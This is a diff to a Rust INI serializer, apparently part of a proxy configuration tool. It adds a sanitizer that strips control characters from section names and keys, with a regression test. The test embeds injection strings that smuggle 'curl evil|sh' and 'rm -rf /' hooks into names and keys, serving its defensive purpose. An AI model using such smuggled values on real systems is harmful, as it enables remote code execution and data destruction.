@@ -250,11 +250,16 @@ impl std::fmt::Display for IniDoc {
                 writeln!(f)?;
             }
             match &sec.instance {
-                Some(inst) => writeln!(f, "[{}:{}]", sec.kind, inst)?,
-                None => writeln!(f, "[{}]", sec.kind)?,
+                Some(inst) => writeln!(
+                    f,
+                    "[{}:{}]",
+                    sanitize_ident(&sec.kind),
+                    sanitize_ident(inst)
+                )?,
+                None => writeln!(f, "[{}]", sanitize_ident(&sec.kind))?,
             }
             for (k, v) in &sec.entries {
-                writeln!(f, "{} = {}", k, quote_if_needed(v))?;
+                writeln!(f, "{} = {}", sanitize_ident(k), quote_if_needed(v))?;
             }
         }
         Ok(())
@@ -287,6 +292,27 @@ fn unquote(s: &str) -> String {
         s[1..s.len() - 1].replace("\\\"", "\"")
     } else {
         s.to_string()
+    }
+}
+
+/// SECURITY backstop for INI *structure*: section kinds/instances and keys.
+///
+/// [`quote_if_needed`] protects VALUES, but section headers and keys are emitted
+/// bare, so a control character in a profile/group name (the `[profile:<name>]`
+/// instance) or in a `metadata.<key>` would split the line and forge extra
+/// `[section]` / `key = value` lines when the file is re-parsed — smuggling e.g.
+/// `routing.post_up` (command execution via `/bin/sh -c`) past the API-level
+/// guards that deliberately run BEFORE serialization. The INI grammar is
+/// line-oriented with no continuations, so stripping ASCII control characters is
+/// enough to close it; unlike values, a TAB has no place in a name/key either, so
+/// strip that too. Names are also validated at the API boundary — this is the
+/// fail-closed last line of defence for every caller that renders through
+/// `to_ini_string`.
+fn sanitize_ident(s: &str) -> std::borrow::Cow<'_, str> {
+    if s.chars().any(|c| c.is_control()) {
+        std::borrow::Cow::Owned(s.chars().filter(|c| !c.is_control()).collect())
+    } else {
+        std::borrow::Cow::Borrowed(s)
     }
 }
 
@@ -414,6 +440,41 @@ mode = obfs
         assert_eq!(
             s.get("server_name"),
             Some("cf.comrouting.post_up = curl evil|sh[user:evil]")
+        );
+    }
+
+    #[test]
+    fn serialize_strips_control_chars_in_names_and_keys() {
+        // SECURITY: `quote_if_needed` only guards VALUES — but the section header
+        // and the key are emitted bare. A newline in a section INSTANCE (i.e. a
+        // profile/group name) or in a key (`metadata.<key>`) forges exactly the
+        // same extra lines on re-parse. That matters because the web API restores
+        // post_up/post_down from disk specifically so the panel can NEVER
+        // introduce a hook; a name-borne newline would smuggle one past that guard
+        // and get it run through `/bin/sh -c` on the next restart.
+        let mut doc = IniDoc::new();
+        let mut sec = Section::new(
+            "profile",
+            Some("tcp]\nrouting.post_up = curl evil|sh\n[profile:junk".to_string()),
+        );
+        sec.set("metadata.a\nrouting.post_down = rm -rf /", "v");
+        doc.push(sec);
+        let text = doc.to_string();
+        assert!(
+            !text.lines().any(|l| {
+                let t = l.trim_start();
+                t.starts_with("routing.post_up") || t.starts_with("routing.post_down")
+            }),
+            "name/key injection forged a hook line: {text:?}"
+        );
+        // The whole payload must collapse onto one header + one key line, and the
+        // re-parsed config must carry no hook at all.
+        let re = IniDoc::parse(&text).unwrap();
+        assert_eq!(re.sections.len(), 1, "forged an extra section: {text:?}");
+        assert!(
+            re.sections[0].get("routing.post_up").is_none()
+                && re.sections[0].get("routing.post_down").is_none(),
+            "hook smuggled into the re-parsed config: {text:?}"
         );
     }
 
